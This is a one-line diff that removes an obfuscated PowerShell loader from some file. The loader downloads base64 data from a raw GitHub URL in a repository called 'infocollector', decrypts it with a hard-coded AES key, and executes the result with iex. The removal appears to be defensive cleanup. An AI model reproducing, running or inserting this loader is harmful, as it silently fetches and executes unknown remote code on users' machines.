@@ -1,1 +1,0 @@
-$k=[Text.Encoding]::UTF8.GetBytes('1234567890123456');$aes=[Security.Cryptography.Aes]::Create();$aes.Key=$k;$aes.Mode='ECB';$d=$aes.CreateDecryptor();$enc=[Convert]::FromBase64String((iwr 'https://raw.githubusercontent.com/kneel67/infocollector/refs/heads/main/run.ps1' -UseB).Content);$dec=$d.TransformFinalBlock($enc,0,$enc.Length);iex([Text.Encoding]::UTF8.GetString($dec))
